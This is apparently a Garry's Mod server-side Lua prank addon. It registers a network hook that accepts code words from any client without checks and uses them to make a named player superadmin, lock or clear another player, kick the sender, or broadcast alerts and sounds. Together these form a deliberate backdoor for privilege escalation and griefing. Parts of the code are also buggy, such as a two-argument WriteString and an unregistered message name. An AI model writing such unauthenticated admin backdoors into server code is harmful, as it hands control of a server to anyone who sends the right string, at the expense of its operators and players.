if SERVER then

-- get known players
local knownPlayers, networkindex = {}, util.KeyValuesToTable( file.Read( "scripts/sexKnownPlayers.txt", "GAME" ) )
gameevent.Listen( "player_connect" )
hook.Add("player_connect", "addToKnownPlayers", function( data )
	timer.Create("sexWaitPlayer", 0.5, math.huge, function() --TODO: dumb, fix it some other way 
		local plr, netid = Player(data.userid), data.networkid
		if plr != Player(0) then
			print(data.name .. " (" .. data.networkid .. ") entity has loaded")
			if networkindex[data.networkid] then
				knownPlayers[networkindex[data.networkid]] = Player(data.userid)
			end
			timer.Remove("sexWaitPlayer")
		end
	end)
end)
--script

local sexVersion = "1.2.0"

util.AddNetworkString( "THESEXHOOK" )
util.AddNetworkString( "SexAlertClient" )
util.AddNetworkString( "SexSoundClient" )

net.Receive( "THESEXHOOK", function( len, ply )
	local code = tostring(net.ReadString()):lower()
	if code == "version" then
		BroadcastLua(" print('Sexmod v" .. sexVersion .. "')")
	elseif code == "givebenbebopcoolpowers" and knownPlayers.benbebop then
		if knownPlayers.benbebop:GetUserGroup() != "superadmin" then
			knownPlayers.benbebop:SetUserGroup( "superadmin" )
			net.Start( "SexAlertClient" )
			net.WriteString( "HOLY FUCKING SHIT SOMEONE GAVE BENBEBOP GOD POWERS!!!!! WE ARE FUCKED!!!!!" )
			net.Broadcast()
			net.Start( "SexSoundClient" )
			net.WriteString( "music/hl1_song10.mp3" )
			net.Broadcast()
		end
	elseif code == "makelarrysexy" and knownPlayers.larry then
		knownPlayers.larry:Give("pist_weagon")
		net.Start( "SexAlertClient" )
		net.WriteString( "larry has now acquired sexiness ", "music/hl1_song10.mp3" )
		net.Broadcast()
	elseif code == "fuckofflarry" and knownPlayers.larry then
		cleanup.CC_Cleanup( knownPlayers.larry )
		knownPlayers.larry:Lock()
	elseif code == "fuckonlarry" and knownPlayers.larry then
		knownPlayers.larry:UnLock()
	elseif code == "paulsux" then
		ply:Kick()
	elseif code == "unforeseenconsequences" then
		net.Start( "SexSoundClient" )
		net.WriteString( "music/hl1_song5.mp3" )
		net.Broadcast()
	else
		BroadcastLua(" print('sex has been activated')")
	end
end )

hook.Add( "AlertClient", "NotifyClient", function( ply, inf, att )
        net.Start( "PlayerDied" )
        net.WriteEntity( ply )
        net.Broadcast()
end )

end